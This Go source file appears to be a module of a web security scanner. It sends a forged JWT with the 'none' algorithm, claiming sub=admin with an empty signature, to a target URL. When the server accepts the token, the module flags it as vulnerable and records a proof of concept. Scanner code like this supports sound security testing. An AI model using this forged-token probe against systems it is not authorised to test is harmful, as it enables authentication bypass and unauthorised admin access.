package core

import (
	"context"
	"fmt"
	"net/http"
	"sync"
	"time"
)

// JWTSecurityAuditResult holds the result of the JWTSecurityAudit module execution.
type JWTSecurityAuditResult struct {
	Target string `json:"target"`
	Status string `json:"status"`
	Detail string `json:"detail,omitempty"`
}

// JWTSecurityAudit executes the jwt_security_audit security technique.
type JWTSecurityAudit struct {
	BaseModule
	Target  string
	results []JWTSecurityAuditResult
}

// NewJWTSecurityAudit creates a new instance.
func NewJWTSecurityAudit(target string) *JWTSecurityAudit {
	return &JWTSecurityAudit{
		BaseModule: BaseModule{
			Client:     NewHTTPClient(10 * time.Second),
			MaxThreads: 5,
		},
		Target: EnsureHTTPPrefix(target),
	}
}

func (m *JWTSecurityAudit) SetThreads(count int) {
	if count < 1 {
		count = 1
	}
	m.MaxThreads = count
}

var jwtPayloads = []string{
	// "none" algorithm JWT (header: alg=none, payload: sub=admin, empty signature)
	"eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiJhZG1pbiJ9.",
}

func (m *JWTSecurityAudit) getBaselineStatus(ctx context.Context) int {
	req, err := http.NewRequestWithContext(ctx, "GET", m.Target, nil)
	if err != nil {
		return 0
	}
	resp, err := m.Client.Do(req)
	if err != nil {
		return 0
	}
	defer resp.Body.Close()
	return resp.StatusCode
}

func (m *JWTSecurityAudit) Execute(ctx context.Context) ([]JWTSecurityAuditResult, error) {
	m.results = make([]JWTSecurityAuditResult, 0)

	baselineStatus := m.getBaselineStatus(ctx)

	jobs := make(chan string, len(jwtPayloads))
	for _, p := range jwtPayloads {
		jobs <- p
	}
	close(jobs)

	var wg sync.WaitGroup

	for i := 0; i < m.MaxThreads; i++ {
		wg.Add(1)
		go func() {
			defer wg.Done()
			for token := range jobs {
				select {
				case <-ctx.Done():
					return
				default:
					m.testToken(ctx, token, baselineStatus)
				}
			}
		}()
	}

	done := make(chan struct{})
	go func() {
		wg.Wait()
		close(done)
	}()

	select {
	case <-done:
		return m.results, nil
	case <-ctx.Done():
		<-done
		return m.results, ctx.Err()
	}
}

func (m *JWTSecurityAudit) testToken(ctx context.Context, token string, baselineStatus int) {
	req, err := http.NewRequestWithContext(ctx, "GET", m.Target, nil)
	if err != nil {
		return
	}
	req.Header.Set("Authorization", "Bearer "+token)

	resp, err := m.Client.Do(req)
	if err != nil {
		return
	}
	defer resp.Body.Close()

	if resp.StatusCode == http.StatusOK && baselineStatus != http.StatusOK {
		m.Mu.Lock()
		m.RecordPoC(req, nil, "Server accepted JWT with 'none' algorithm")
		m.results = append(m.results, JWTSecurityAuditResult{
			Target: m.Target,
			Status: "vulnerable",
			Detail: "Server accepted JWT with 'none' algorithm",
		})
		m.Mu.Unlock()
	}
}

func init() {
	RegisterModule("jwt_security_audit", func(payload map[string]any, onLog func(string)) (ExecutableModule, error) {

		target := PayloadString(payload, "url", "http://127.0.0.1")
		onLog(fmt.Sprintf("Starting JWTSecurityAudit on: %s", target))

		tester := NewJWTSecurityAudit(target)

		return ModuleWrapper{
			Module: tester,
			ExecuteFunc: func(ctx context.Context) (any, error) {
				return tester.Execute(ctx)
			},
		}, nil
	})
}
